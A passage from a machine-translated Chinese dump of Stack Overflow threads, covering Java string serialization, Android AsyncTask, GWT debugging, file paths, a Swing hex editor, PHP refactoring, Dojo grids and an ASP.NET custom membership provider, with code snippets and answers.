        StringBuilder sizes = new StringBuilder("$");
        StringBuilder result = new StringBuilder();

        for (String str : strs) {
            if (sizes.length() != 1) {
                sizes.append(';');
            }
            sizes.append(str.length());
            result.append(str);
        }

        result.append(sizes.toString());
        return result.toString();
    }

    public static void testBase64(String[] strs) throws IOException, ClassNotFoundException, DecoderException {
        // serialize
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        new ObjectOutputStream(out).writeObject(strs);

        // your string
        String yourString = new String(Base64.encodeBase64(out.toByteArray()));

        // deserialize
        ByteArrayInputStream in = new ByteArrayInputStream(Base64.decodeBase64(yourString.getBytes()));
    }

    public static void testHex(String[] strs) throws IOException, ClassNotFoundException, DecoderException {
        // serialize
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        new ObjectOutputStream(out).writeObject(strs);

        // your string
        String yourString = new String(Hex.encodeHex(out.toByteArray()));

        // deserialize
        ByteArrayInputStream in = new ByteArrayInputStream(Hex.decodeHex(yourString.toCharArray()));
    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-08T14:40:37.223

使用像 Jackson 这样的 Json 解析器来序列化/反序列化其他类型的对象，以及像整数/浮点数到字符串并返回。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:19:41.283

我会在单词之间使用符号，以便稍后使用该`String#split`方法来取回字符串。根据您的`$`符号示例，它将是

```
public String mergeStrings(String[] ss) {
    StringBuilder sb = new StringBuilder();
    for(String s : ss) {
        sb.append(s);
        sb.append('$');
    }
    return sb.toString();
}

public String[] unmergeStrings(String s) {
    return s.split("\\$");
} 
```

请注意，在本例中，我`\`在符号前添加了一个双精度值，`$`因为该`String#split`方法接收正则表达式作为参数，而`$`符号是正则表达式中的特殊字符。

```
public String processData(String[] ss) {
    String mergedString = mergeStrings(ss);
    //process data...
    //a little example...
    for(int i = 0; i < mergedString.length(); i++) {
        if (mergedString.charAt(i) == '$') {
            System.out.println();
        } else {
            System.out.print(mergedString.charAt(i));
        }
    }
    System.out.println();
    //unmerging the data again
    String[] oldData = unmergeStrings(mergedString);
} 
```

为了支持您的任何字符`String[]`，最好不要将单个字符设置为分隔符，而是设置另一个字符`String`。这些方法将变成这样：

```
public static final String STRING_SEPARATOR = "@|$|@";
public static final String STRING_SEPARATOR_REGEX = "@\\|\\$\\|@";

public String mergeStrings(String[] ss) {
    StringBuilder sb = new StringBuilder();
    for(String s : ss) {
        sb.append(s);
        sb.append(STRING_SEPARATOR);
    }
    return sb.toString();
}

public String[] unmergeStrings(String s) {
    return s.split(STRING_SEPARATOR_REGEX);
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-07T14:19:01.430

Just use a known separator (such as `@` or `#` to append your strings), then use yourString.split(yourSeparator) to get an array from it.

# android - 异步任务让 UI 卡住

> ID：13271506
> 
> 赞同：1
> 
> 时间：2012-11-07T14:13:53.917
> 
> 标签：android, multithreading

在我离开活动之前，我有 2 个异步任务（执行服务器请求）正在运行。有时运行此异步任务的活动会卡住，直到异步任务完成，有时下一个活动会显示并卡住，直到异步任务完成。

我的问题是我如何以我的活动的 UI 不会卡住的方式运行此任务（UI 不依赖于异步任务中的响应）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:17:59.733

您可能正在调用`AsyncTask.get()` 活动代码中的某个位置。如果您在任务完成执行之前调用它，它会等到它完成（从而使您的 UI 卡住）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T15:24:20.153

你能试试这个。

1.  创建一个 ProgressDialog 将其设置为不确定并显示它。
2.  调用 AsyncTask1 并在其 PostExecute 中调用 AsyncTask2。确保你需要调用这个 onUiThread。
3.  在 Asynctask2 的 Postexecute 中，关闭 Progress 对话框并启动下一个 Activity。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:20:13.430

确保您在`onPostExecute()`第一个异步任务中开始您的下一个活动。如果您在新活动中有一个异步任务，请将其作为 onCreate 方法的最后一项调用。遵循这些简单的规则应该会有所帮助

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-12T06:36:06.800

只写代码`AsyncTask` `doInBackground()`并调用它。这样您就可以检查它是否正在访问任何 UI。

例如：`TestAsync extends AsyncTask...`

```
TestAsync async = new TestAsync();
async.execute(); 
```

尝试这个。通常，`AsyncTask`应该在单独的线程中运行。如果创建两个实例。并调用execute，它应该独立执行。但是可能只有一个线程可用，所以它应该等待（在较低版本中，池大小为 1。）。

```
@TargetApi(Build.VERSION_CODES.HONEYCOMB) // API 11
void startMyTask(AsyncTask asyncTask) {
    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB)
        asyncTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, params);
    else
        asyncTask.execute(params);
} 
```

其他方式是，您应该在普通线程中运行它。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2016-09-12T06:32:13.340

您必须在您的活动中一次调用 2 个活动

1.  所以要么你必须使用同步类或函数来调用异步任务

2.  或者您必须使用单例类来调用该异步任务，以便以同步方式调用 api

3.  因为异步任务使用主 ui 线程来完成任务，所以这可能是活动卡住的原因

# java - 如何调试 GWT 开发/托管模式的问题？

> ID：13271510
> 
> 赞同：0
> 
> 时间：2012-11-07T14:14:05.380
> 
> 标签：java, debugging, gwt, maven

我正在尝试在基于 Maven 的 Java webapp 中设置 GWT 开发/托管模式。我通过 Maven Tomcat7 插件 (mvn tomcat7:run-war-only) 启动我的 webapp，它运行良好。此外，通过 mvn gwt:run 启动 GWT 可以正常工作并且没有显示错误。

但是，如果我使用 gwt.codesvr=127.0.0.1:9997 参数访问我的 webapp，我只会在浏览器中看到一个空白页面。有趣的是，页面源包含我的 JSP 的内容，但它只是定义了一些要被 GWT 替换的 div。

我该如何调试这种情况？我还没有找到 GWT 开发模式的任何选项来生成某种日志输出。例如，知道 GWT 代码服务器是否曾经收到过调用会很有趣。目前，我想知道从哪里开始寻找 GWT 开发模式为什么不起作用的任何线索。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T20:33:08.403

我最初的问题是，如何调试 Maven GWT 插件，以防它没有做它应该做的事情。以下是在此过程中对我有帮助的一些提示：

*   通过配置参数将日志级别提高到 ALL
*   在浏览器中检查（例如通过 Firebug）是否查询了像 devmode.js 和 hosts.html 这样的托管模式文件
*   插入 Window.alert("..."); 进入 onModuleLoad() 函数以查看 GWT 代码是否已执行
*   确保您的应用服务器正在执行爆炸战争（例如，在启动应用服务器之前删除打包的 WAR 文件）
*   应用服务器启动后，不要调用没有 GWT codeserver 参数的页面，因为这已经在 webapp 展开文件夹中生成了一些 GWT 文件，这些文件可能与 GWT 托管模式创建的文件冲突；记下创建了哪些文件并手动删除它们
*   GWT 开发模式似乎不是完全确定的，因为在我的浏览器中强制重新加载页面后我能够让它运行
*   从一个工作示例开始，例如我在这里分享的示例：[https ://github.com/steinsag/gwt-maven-example](https://github.com/steinsag/gwt-maven-example)

# java - 如何修复这个 java.io.FileNotFoundException？

> ID：13271511
> 
> 赞同：0
> 
> 时间：2012-11-07T14:14:12.687
> 
> 标签：java, ioexception, filenotfoundexception

我正在尝试在程序中加载 .csv 文件，但由于某种原因，它无法找到该文件。我应该把文件放在哪里？

![在此处输入图像描述](../Images/ce440704624a7e26c05b2b816b85ee61.png)

**安慰**

![在此处输入图像描述](../Images/d8eff090c66942d5de1bc073af28e075.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T14:17:21.417

看起来文件在`src`目录中......几乎可以肯定它不是您正在运行的工作目录。

选项：

*   指定绝对文件名
*   将文件复制到您的工作目录
*   将工作目录更改为`src`
*   指定一个相对文件名，确定工作目录的位置
*   将其作为*资源*包含，并使用`Class.getResourceAsStream`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:16:42.507

它尝试读取的路径肯定与该文件实际存在的路径不完全相同。尝试打印该文件的绝对路径并将其与文件的实际路径进行比较。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-07T14:36:52.923

该文件位于 src 目录中，因此为了访问它，您应该使用

```
src/Elevator.csv 
```

只要文件位于项目文件夹中，您就可以使用相对路径访问它们。

例如，如果文件位于 Elevator 文件夹下，则您仅使用其文件名即可访问该文件。

```
Elevator.csv 
```

在项目中使用附加文件时，一个好的原则是创建与源文件所在的文件夹不同的文件夹。所以你可以在项目文件夹下创建一个文件夹资源并将你的文件放在那里。您可以使用以下方式访问该文件

```
resources/Elevator.csv 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-19T14:46:06.187

我尝试了上面提到的所有解决方案，但是没有用。但是我去了我的项目文件夹并删除了目标并尝试再次编译该项目。然后它成功地工作了

# javascript - 将 SVG 嵌入到下拉菜单中

> ID：13271514
> 
> 赞同：3
> 
> 时间：2012-11-07T14:14:24.677
> 
> 标签：javascript, html, drop-down-menu, svg

我还没有找到任何方法，但我想知道是否有办法将 SVG 嵌入到下拉菜单中。我的 HTML 中已经有一个 SVG，而且似乎连下拉菜单都无法正常工作，但是当我在 W3 上的“Tryit 编辑器”之类的东西中编写所有 JS 时，一切正常，但我缺乏添加的能力SVG 我需要添加。

```
 <svg height="100%" width="100%">
      <defs>
        <linearGradient id="grad3" x1="0%" y1="0%" x2="0%" y2="100%">
          <stop offset="0%" style="stop-color:rgb(0, 96, 45);stop-opacity:1" />
          <stop offset="100%" style="stop-color:rgb(0, 172, 68);stop-opacity:1" />
        </linearGradient>
      </defs>
      <rect width="930" height="340" fill="url(#grad3)" />
    </svg> 
```

如果有帮助，这里有我的 SVG 代码。

提前致谢！

# javascript - IE9 处于 Quirks 模式.. 什么可能导致此代码出现问题？

> ID：13271526
> 
> 赞同：1
> 
> 时间：2012-11-07T14:14:55.293
> 
> 标签：javascript, jquery, internet-explorer, quirks-mode

我正在使用以下代码：

（删节的 JavaScript）

```
Input = {};
Input.URL = 'http://my.script.location/script.php';

Input.populateFaculties = function() {
    $('#courses').empty();
    $('#courses_reset').empty();

    $('#faculties').append('<select id="faculty_populated"></select>');

    for (var i = 0; i < Input.courses.length; i++) {
        $('#faculty_populated').append('<option value="' + Input.courses[i].Faculty_ID + '">' + Input.courses[i].Title + '</option>');
    }

    $('#faculty_populated').on("click", "option", function(event) {
        var id = $(this).val();
        UWA.Data.getJson(Input.URL + '?cmd=populateCourses&faculty=' + id, Input.populateCourses);
    });
}

Input.populateCourses = function(data) {
    $('#faculties').empty();
    $('#courses_reset').html('<img src="/user/74/138869.png" style="width:24px;" alt="Reset options" />');

    $('#courses_reset').on("click", "img", function(event) {
        Input.populateFaculties();
    });

    $('#courses').append('<select id="courses_populated"></select>');

    for (var i = 0; i < data.length; i++) {
        $('#courses_populated').append('<option value="' + data[i].Course_ID + '">' + data[i].Course + '</option>');
    }
} 
```

（删节的 HTML）

```
<tr>
    <td class="left">Course</td>
    <td>
        <span id="faculties">

        </span>

        <span id="courses">

        </span>

        <span id="courses_reset">

        </span>
    </td>
</tr> 
```

它在 FireFox 中完美运行，但在 Internet Explorer 9 中不起作用。

值得注意的是，由于我使用的是 Netvibes UWA 小部件框架，IE 处于“Quirks”模式，因此我无法控制将其强制为标准模式。

**我没有看到任何错误，但是单击教师下拉菜单后，什么也没有发生**。在 FireFox 中，单击`#faculty`下拉列表会清空`#faculty`并填充`#courses`.

这段代码中是否有任何关于 Internet Explorer 可能不处理代码的原因显而易见？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T21:13:00.733

这可能是导致问题的文档类型中或之前的问题。Netvibes UWA 不会将 IE 置于 quirks 模式（如果它是一个错误）。

为您的代码提供链接/粘贴可能会有所帮助。

# java - 如何在swings中将动态键入的文本存储在字符串中

> ID：13271529
> 
> 赞同：1
> 
> 时间：2012-11-07T14:15:06.350
> 
> 标签：java, string, swing, bytearray, keyboard-events

我正在尝试开发一个十六进制编辑器，其中编辑器面板提供了关键侦听器，并且通过键盘的输入被转换为相应的输入。然而，问题在于保存隐蔽的输入。现在一次只转换一个键击值。我想在字符串中使用这个转换后的 input() 并将其用于其他目的。我试图将转换后的文本保存在一个字节数组中，但它返回我输入的第一个值，而不管之后的输入是什么。

```
package gui.hex;

import javax.swing.*;

import cryptool.Test;

import java.awt.*;
import java.awt.event.*;
import java.nio.charset.Charset;
import java.nio.charset.CharsetEncoder;

public class JHexEditorASCII extends JComponent implements MouseListener,
        KeyListener {

    private static final long serialVersionUID = 5636121664420538046L;
    private JHexEditor he;
    private static CharsetEncoder encoder = Charset.forName("UTF-8")
            .newEncoder();
    public static String modifiedText;
    public static byte temp[];

    public static byte[] getTemp() {
        return temp;
    }

    public void setTemp(byte[] temp) {
        this.temp = temp;
    }

    protected JHexEditorASCII(JHexEditor he) {
        this.he = he;
        addMouseListener(this);
        addKeyListener(this);
        addFocusListener(he);
    }

    public Dimension getPreferredSize() {
        debug("getPreferredSize()");
        return getMinimumSize();
    }

    public Dimension getMinimumSize() {
        debug("getMinimumSize()");

        Dimension d = new Dimension();
        FontMetrics fn = getFontMetrics(JHexEditor.font);
        int h = fn.getHeight();
        int nl = he.getLines();
        d.setSize((fn.stringWidth(" ") + 1) * (16) + (he.border * 2) + 1, h
                * nl + (he.border * 2) + 1);
        return d;
    }

    public void paint(Graphics g) {
        debug("paint(" + g + ")");
        debug("cursor=" + he.cursor + " buff.length=" + he.buff.length);
        Dimension d = getMinimumSize();

        // sets the color to the background.
        g.setColor(Color.orange);
        g.fillRect(0, 0, d.width, d.height);
        g.setColor(Color.black);

        g.setFont(JHexEditor.font);

        // ascii data
        int ini = he.getInitial() * 16;
        int fin = ini + (he.getLines() * 16);
        if (fin > he.buff.length)
            fin = he.buff.length;

        int x = 0;
        int y = 0;
        for (int n = ini; n < fin; n++) {
            if (n == he.cursor) {

                // sets color for the focus cursor it used to be in blue color.
                g.setColor(Color.red);
                if (hasFocus())
                    he.background(g, x, y, 1);
                else
                    he.table(g, x, y, 1);
                if (hasFocus())
                    g.setColor(Color.white);
                else
                    g.setColor(Color.black);
            } else {
                g.setColor(Color.black);
            }

            // builds a character object
            String s;

            if (encoder.isLegalReplacement(new byte[] { he.buff[n] }))
                s = "" + new Character((char) he.buff[n]);
            else
                s = ".";

            // compares the input supplied
            // if ((he.buff[n] < 20) || (he.buff[n] > 126))

            // converts the input entered into string
            // s = ".";
            // displaying of the text goes here.

            // displays the input

            System.out.println("the typed in string is:" + s);

            temp = s.getBytes();
            setTemp(temp);

            setModifiedText(s);

            he.printString(g, s, (x++), y);

            if (x == 16) {
                x = 0;
                y++;
            }
        }

    }

    private void debug(String s) {
        if (he.DEBUG)
            System.out.println("JHexEditorASCII ==> " + s);
    }

    public void dispaly(Graphics g) {
        int x = 0;
        int y = 0;

        he.printString(g, Test.getK(), (x++), y);
        if (x == 16) {
            x = 0;
            y++;
        }
    }

    // calculate the position of the mouse
    public int calculateMousePosition(int x, int y) {
        FontMetrics fn = getFontMetrics(JHexEditor.font);
        x = x / (fn.stringWidth(" ") + 1);
        y = y / fn.getHeight();
        debug("x=" + x + " ,y=" + y);
        return x + ((y + he.getInitial()) * 16);
    }

    // mouselistener
    public void mouseClicked(MouseEvent e) {
        if (e.getClickCount() == 2) {
            // double clicked
            he.setNewTextListener.actionPerformed(new ActionEvent(this, 0,
                    "NEWASCII"));
        }

        debug("mouseClicked(" + e + ")");
        he.cursor = calculateMousePosition(e.getX(), e.getY());
        this.requestFocus();
        he.repaint();
    }

    public void mousePressed(MouseEvent e) {
    }

    public void mouseReleased(MouseEvent e) {
    }

    public void mouseEntered(MouseEvent e) {
    }

    public void mouseExited(MouseEvent e) {
    }

    // KeyListener
    public void keyTyped(KeyEvent e) {
        debug("keyTyped(" + e + ")");

        // only add content, if buffer is large enough
        if (he.buff.length > he.cursor) {
            he.buff[he.cursor] = (byte) e.getKeyChar();

            if (he.cursor != (he.buff.length - 1))
                he.cursor++;
            // change this
            // System.out.println( he.buff.toString());

            he.repaint();
        }
    }

    public void keyPressed(KeyEvent e) {
        debug("keyPressed(" + e + ")");
        he.keyPressed(e);
    }

    public void keyReleased(KeyEvent e) {
        debug("keyReleased(" + e + ")");
    }

    public boolean isFocusTraversable() {
        return true;
    }

    public static String getModifiedText() {
        return modifiedText;
    }

    public void setModifiedText(String modifiedText) {
        this.modifiedText = modifiedText;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:50:29.053

*   开发一个十六进制编辑器 ( `encoder.isLegalReplacement...`)

*   使用`JTextField`with `DocumentFilter`，或者最简单的可以通过使用to来`JFormatterTextField`代替绘制字符`paint()``JComponent`

*   使用`paintComponent`（而不是`paint()`）为`Swing JComponents`

*   添加`DocumentListener`到`JTextField with DocumentFilter`或`JFormatterTextField`

*   有趣的方式可能是构建/准备/创建一个`ArrayList of hex ()`并使用[`AutoComplete JTextField`](https://stackoverflow.com/a/7255918/714968)

# eclipse - 最新的 Eclipse Mule ESB 插件？

> ID：13271530
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:15:07.457
> 
> 标签：eclipse, plugins, esb, mule

Eclipse 有没有官方的 Mule 插件？

我只找到了这个[http://dist.codehaus.org/mule/muleide/updates/](http://dist.codehaus.org/mule/muleide/updates/)但它适用于 Mule 2。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:51:49.010

[您可以在此处](http://www.mulesoft.org/documentation/display/MULE3INSTALL/Installing+Mule+ESB+3+and+the+Mule+IDE)找到有关如何安装 Mule IDE 的文档。请记住，Mule IDE 已停止支持 Mule Studio，如此[处所述](http://www.mulesoft.org/documentation-3.2/display/MULE3STUDIO/Studio+FAQ)

# php - 这个 php 迭代可以写得更短/更好吗？

> ID：13271532
> 
> 赞同：1
> 
> 时间：2012-11-07T14:15:17.647
> 
> 标签：php, optimization

代码运行完美，但由于我在重复自己（我喜欢在编程时避免），我想知道这是否可以写得更短/更好？

```
$start = getLocaleDate($item[0]['start_day']);
$start = $start['day_int'] . ' ' . $start['month_string'];
if ($item[0]['start_houre'] !== '00:00:00') {
    $houre = stripLeadingZero(substr($item[0]['start_houre'], 0, 2));
    $minute = substr($item[0]['start_houre'], 3, 2);
    $start .= ' at' . $houre . 'u' . $minute;
}

$end = getLocaleDate($item[0]['end_day']);
$end = $end['day_int'] . ' ' . $end['month_string'];
if ($item[0]['end_houre'] !== '00:00:00') {
    $houre = stripLeadingZero(substr($item[0]['end_houre'], 0, 2));
    $minute = substr($item[0]['end_houre'], 3, 2);
    $end .= ' at' . $houre . 'u' . $minute;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:17:58.103

当然，您可以编写一个函数，在其中传递您的项目和要使用的密钥

```
function your_function($item, $key) {
  $h = $item[$key.'_houre'];
  $time = getLocaleDate($item[$key. '_day']);
  $time = $end['day_int'] . ' ' . $end['month_string'];
  if ($h !== '00:00:00') {
    $houre = stripLeadingZero(substr($h , 0, 2));
    $minute = substr($h , 3, 2);
    $time .= ' at' . $houre . 'u' . $minute;
    return $time;
  }

}

your_function($item[0], 'end');
your_function($item[0], 'start'); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:18:46.230

在不更改任何功能的情况下，您可以将其变成一个函数：

```
function getTime($item, $which) {
    $time = getLocaleDate($item[0][$which . '_day']);
    $time = $time['day_int'] . ' ' . $time['month_string'];
    if ($item[0][$which . '_houre'] !== '00:00:00') {
        $houre = stripLeadingZero(substr($item[0][$which . '_houre'], 0, 2));
        $minute = substr($item[0][$which . '_houre'], 3, 2);
        $time .= ' at' . $houre . 'u' . $minute;
    }
    return $time;
}

$start = getTime($item, 'start');
$end = getTime($item, 'end'); 
```

* 应该注意的是，这段代码并没有做任何错误检查/预防，所以如果 没有索引`0`，`$item`你将有一个错误（同样适用于`$item[0]['start_day']`,`$item[0]['end_day']`等）。要处理简单的情况，您可以添加`if (!isset($item[0])) return '';`到函数的开头，如果这是一个问题。

# .net - 如何在 VB.NET 中处理 DataGridView 事件 CollectionChanged？

> ID：13271536
> 
> 赞同：0
> 
> 时间：2012-11-07T14:15:45.900
> 
> 标签：.net, vb.net, datagridview

我想在我的 winforms 应用程序中处理一个简单 DataGridView 的 CollectionChanged 事件。我可以使用以下代码使用 C# 处理它：

```
this.datagridview.DataBindings.CollectionChanged += DataBindings_CollectionChanged; 
```

但是如何使用 VB.NET 处理事件？我无法通过以下方式访问代码中的 DataBindings 属性：

```
Private Sub handleCollectionChanged(sender As Object, e As EventArgs) Handles datagridview.DataBinding.CollectionChanged
    ' do something
End Sub 
```

我试过了

```
Private WithEvents dataBinding As System.Windows.Forms.ControlBindingsCollection
Public Sub New()
    InitializeComponent()
    dataBinding = RadGridView1.DataBindings
End Sub 
```

但这也行不通。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:39:45.863

关于我上面的评论：我发现，我的示例工作正常，问题是另一个：CollectionChanged 事件仅引发，如果后面的数据绑定集合发生了变化，而不是绑定数据的内容发生了变化。要处理网格数据源的更改，您可以处理用于数据源的对象列表的 ListChanged 事件。

# json - 刷新 Dojo 网格中显示的数据

> ID：13271541
> 
> 赞同：0
> 
> 时间：2012-11-07T14:16:01.510
> 
> 标签：json, datagrid, dojo

我有一个道场网格。每行都有一个指向公式的链接，可以在其中更改数据。现在，当我单击保存并关闭（在表单中）时，我希望网格重新加载显示的数据。到目前为止，我已经设法重新加载数据，但我总是跳回到网格的开头。但是，例如，如果我在表格的末尾，我只想重新加载最后几个条目。
我的网格连接到 JSONRest 存储，所以基本上我应该知道现在显示的范围...... 我如何获得范围？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T21:46:31.170

如果您已通过商店支持您的网格，您只需将更改的对象“放入”您的商店。您正在使用的 JsonRest 存储将通过 PUT 请求将更改发送回您的服务器，并且网格将获取更改并更新相应的项目。

在表单中按保存时，您需要创建表单数据的 json 表示（与网格中使用的数据匹配）并将其放入存储中：

```
require(["dojo/dom-form", ... ], function(domForm, ...) {
    ...
    var updatedItem = domForm.toObject("yourFormId");
    yourGridStore.put(updatedItem).then(function() {
        console.log("put was successful");
    });
    ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:24:10.070

我已经设法解决了这个问题，没有任何东西放到商店里。这是代码：

```
grid._lastScrollTop=grid.scrollTop;
grid._refresh(); 
```

这是我找到答案的链接[。](http://dojo-toolkit.33424.n3.nabble.com/how-to-Refresh-DataGrid-and-scroll-to-old-position-td2026298.html)答案是 6。

# c# - 编写自定义会员提供程序

> ID：13271544
> 
> 赞同：1
> 
> 时间：2012-11-07T14:16:21.243
> 
> 标签：c#, .net, membership-provider, sqlmembershipprovider

我正在通过实现 System.Web.Security.membershipprovider 来编写自定义成员资格提供程序类。

现在我的问题是在访问课程时出现错误

错误代码 ：

```
String reference not set to an instance of a String.
Parameter name: s 
```

堆栈跟踪：

```
 at System.Text.Encoding.GetBytes(String s)
   at ss.Provider.EncodePassword(String password) 
   at ss.Provider.CreateUser(String username, String password, String email, String passwordQuestion, String passwordAnswer, Boolean isApproved, Object providerUserKey, MembershipCreateStatus& status) 
   at System.Web.UI.WebControls.CreateUserWizard.AttemptCreateUser()
   at System.Web.UI.WebControls.CreateUserWizard.OnNextButtonClick(WizardNavigationEventArgs e)
   at System.Web.UI.WebControls.Wizard.OnBubbleEvent(Object source, EventArgs e)
   at System.Web.UI.WebControls.CreateUserWizard.OnBubbleEvent(Object source, EventArgs e)
   at System.Web.UI.WebControls.Wizard.WizardChildTable.OnBubbleEvent(Object source, EventArgs args)
   at System.Web.UI.Control.RaiseBubbleEvent(Object source, EventArgs args)
   at System.Web.UI.WebControls.Button.OnCommand(CommandEventArgs e)
   at System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument)
   at System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument)
   at System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument)
   at System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData)
   at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) 
```

我的课是

创建用户：

```
 public override MembershipUser GetUser(object userID,bool userIsOnline)
        {
            SqlConnection sqlConnection = new SqlConnection(connectionString);
            SqlCommand sqlCommand = new SqlCommand("User_SelByUserID", sqlConnection);

            sqlCommand.CommandType = CommandType.StoredProcedure;
            sqlCommand.Parameters.Add("@userID", SqlDbType.UniqueIdentifier).Value = userID;

            MembershipUser membershipUser = null;
            SqlDataReader sqlDataReader = null;

            try
            {
                sqlConnection.Open();

                sqlDataReader = sqlCommand.ExecuteReader(CommandBehavior.CloseConnection);

                if (sqlDataReader.HasRows)
                {
                    sqlDataReader.Read();
                    membershipUser = GetUserFromReader(sqlDataReader);

                    if (userIsOnline)
                    {
                        SqlCommand sqlUpdateCommand = new SqlCommand("User_UpdateActivityDate_ByUserID", sqlConnection);

                        sqlUpdateCommand.CommandType = CommandType.StoredProcedure;
                        sqlUpdateCommand.Parameters.Add("@userID", SqlDbType.NVarChar, 255).Value = userID;
                        sqlUpdateCommand.Parameters.Add("@applicationName", SqlDbType.NVarChar, 255).Value = applicationName;
                        sqlUpdateCommand.ExecuteNonQuery();
                    }
                }
            }
            catch (SqlException e)
            {
                //Add exception handling here.
            }
            finally
            {
                if (sqlDataReader != null) { sqlDataReader.Close(); }
            }

            return membershipUser;

        } 
```

编码密码：

```
private string EncodePassword(string password)
        {
            string encodedPassword = password;

            switch (PasswordFormat)
            {
                case MembershipPasswordFormat.Clear:
                    break;
                case MembershipPasswordFormat.Encrypted:
                    encodedPassword = Convert.ToBase64String(EncryptPassword(Encoding.Unicode.GetBytes(password)));
                    break;
                case MembershipPasswordFormat.Hashed:
                    HMACSHA1 hash = new HMACSHA1();
                    hash.Key = HexToByte(machineKey.ValidationKey);
                    encodedPassword = Convert.ToBase64String(hash.ComputeHash(Encoding.Unicode.GetBytes(password)));
                    break;
                default:
                    throw new ProviderException("Unsupported password format.");
            }

            return encodedPassword;
        } 
```

给定字符串的密码是 Gowtham!1

更新：

```
 public override MembershipUser CreateUser(string username, string password, string email, string passwordQuestion, string passwordAnswer, bool isApproved, object providerUserKey, out MembershipCreateStatus status)
        {

            ValidatePasswordEventArgs args = new ValidatePasswordEventArgs(username, password, true);

            OnValidatingPassword(args);

            if (args.Cancel)
            {
                status = MembershipCreateStatus.InvalidPassword;
                return null;
            }

            if ((RequiresUniqueEmail && (GetUserNameByEmail(email) != String.Empty)))
            {
                status = MembershipCreateStatus.DuplicateEmail;
                return null;
            }

            MembershipUser membershipUser = GetUser(username, false);

            if (membershipUser == null)
            {
                System.DateTime createDate = DateTime.Now;

                SqlConnection sqlConnection = new SqlConnection(connectionString);
                SqlCommand sqlCommand = new SqlCommand("User_Ins", sqlConnection);

                sqlCommand.CommandType = CommandType.StoredProcedure;
                sqlCommand.Parameters.Add("@returnValue", SqlDbType.Int, 0).Direction = ParameterDirection.ReturnValue;
                sqlCommand.Parameters.Add("@username", SqlDbType.NVarChar, 255).Value = username; ;
                sqlCommand.Parameters.Add("@applicationName", SqlDbType.NVarChar, 255).Value = applicationName;
                sqlCommand.Parameters.Add("@password", SqlDbType.NVarChar, 255).Value = EncodePassword(password);
                sqlCommand.Parameters.Add("@email", SqlDbType.NVarChar, 128).Value = email;
                sqlCommand.Parameters.Add("@passwordQuestion", SqlDbType.NVarChar, 255).Value = passwordQuestion;
                sqlCommand.Parameters.Add("@passwordAnswer", SqlDbType.NVarChar, 255).Value = EncodePassword(passwordAnswer);
                sqlCommand.Parameters.Add("@isApproved", SqlDbType.Bit).Value = isApproved;
                sqlCommand.Parameters.Add("@comment", SqlDbType.NVarChar, 255).Value = String.Empty;

                try
                {
                    sqlConnection.Open();

                    sqlCommand.ExecuteNonQuery();
                    if ((int)sqlCommand.Parameters["@returnValue"].Value == 0)
                    {

                        status = MembershipCreateStatus.Success;
                    }
                    else
                    {
                        status = MembershipCreateStatus.UserRejected;
                    }
                }
                catch (SqlException e)
                {
                    //Add exception handling here.

                    status = MembershipCreateStatus.ProviderError;
                }
                finally
                {
                    sqlConnection.Close();
                }

                return GetUser(username, false);
            }
            else
            {
                status = MembershipCreateStatus.DuplicateUserName;
            }

            return null;
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:16:58.603

一个猜测，但我敢打赌，这不是`password`变量，这是因为您正在尝试对`passwordAnswer`未传入或传入空值的编码进行编码。您可能没有使用此功能，这是恢复 MS 未弃用的密码的日期和危险方式。

这一行在`CreateUser`：

```
 sqlCommand.Parameters.Add("@passwordAnswer", SqlDbType.NVarChar, 255).Value = EncodePassword(passwordAnswer);  \\THIS LINE IS PROBABLY THE PROBLEM 
```

试试这个，但前提是你绝对不使用这个功能：

```
 sqlCommand.Parameters.Add("@passwordAnswer", SqlDbType.NVarChar, 255).Value = passwordAnswer; 
```

您应该能够在调试中轻松检查这一点。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-07T14:38:07.337

使用调试器找出发生了什么。

如果你不知道怎么做，那么，添加这一行：

```
if(password == null)
    throw new Exception("Password is null here, I get it, now I'll try to find where is wrong!"); 
```

在 CreateUser 方法的这一行之前：

```
ValidatePasswordEventArgs args = new ValidatePasswordEventArgs(username, password, true); 
```

然后再次运行，看看是否有任何事情发生。

# javascript - jQuery div 跌落效果 onload

> ID：13271548
> 
> 赞同：4
> 
> 时间：2012-11-07T14:16:37.543
> 
> 标签：javascript, jquery, html, animation

我试图让一个大徽标（在我网站的标题中）在加载时落入标题区域。所以这是我能找到的唯一符合这个想法的 jquery 函数。

